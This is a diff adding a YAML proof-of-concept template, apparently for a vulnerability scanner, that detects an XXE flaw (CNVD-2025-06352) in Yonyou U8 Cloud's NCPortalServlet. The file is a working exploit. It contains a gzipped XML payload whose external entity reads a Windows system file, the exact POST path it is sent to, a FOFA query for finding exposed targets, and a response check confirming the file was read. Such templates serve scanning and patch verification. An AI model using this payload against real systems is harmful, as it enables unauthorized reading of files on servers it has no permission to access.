@@ -1,0 +1,23 @@
+id: poc-yaml-yongyou-u8cloud-ncportalservlet-xxe-cnvd-2025-06352
+info:
+  name: 用友U8 Cloud NCPortalServlet XXE漏洞(CNVD-2025-06352)
+  severity: high
+  tags:
+  - CNVD-2025-06352
+  - xxe
+  - 两高一弱
+  finger: 用友U8cloud
+  fofa: title="U8C"
+variables:
+  content: str(`<?xml version="1.0"?><!DOCTYPE root [ <!ENTITY xxe SYSTEM "file:///C://windows/win.ini">
+    ]><data><transinfo type="portal_login"><accountcode>&xxe;</accountcode></transinfo></data>`)
+  payload: gzip(content)
+requests:
+- method: POST
+  path: /servlet/~uap/nc.merp.bs.maportal.NCPortalServlet
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: '{{.payload}}'
+  expression: status_code == 200 && contains(gunzip(body),"xml") && contains(gunzip(body),"extensions")
+    && contains(gunzip(body),"files") && contains(gunzip(body),"fonts")
+transport: http
